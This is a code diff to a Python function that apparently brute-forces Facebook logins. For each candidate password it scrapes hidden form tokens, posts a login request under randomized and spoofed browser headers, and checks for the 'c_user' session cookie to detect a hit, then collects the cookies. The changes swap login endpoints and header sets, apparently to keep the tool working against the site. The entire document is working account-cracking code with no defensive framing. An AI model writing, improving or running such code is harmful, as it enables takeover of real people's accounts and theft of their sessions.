@@ -1140,7 +1140,7 @@ def m5(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://m.facebook.com').text
+   free_fb = session.get(f'https://en-gb.facebook.com').text
    log_data = {'m_ts':re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
 'li':re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
 'try_number': '0',
@@ -1165,30 +1165,15 @@ def m5(idf,pwv):
 '__user': '0',
 '_fb_noscript': 'true'}
    header_freefb = {
-    'authority': 'm.facebook.com',
-    'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded',
-    'dpr': '2.75',
-    'origin': 'https://m.facebook.com',
-    'referer': 'https://m.facebook.com/login.php?...',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"ABCDEF"',
-    'sec-ch-ua-platform': '"meta"',
-    'sec-ch-ua-platform-version': '"00"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4361.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;',
-    'viewport-width': '393',
-    'x-asbd-id':re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-    'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-    'x-requested-with': 'XMLHttpRequest',
-    'x-response-format': 'JSONStream'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post("https://www.facebook.com/login/device-based/regular/login/",data=log_data,headers=header_freefb).text
+    'Host': 'www.facebook.com',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+    'TE': 'Trailers'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+   lo = session.post("https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100",data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([cookie for cookie in session.cookies])
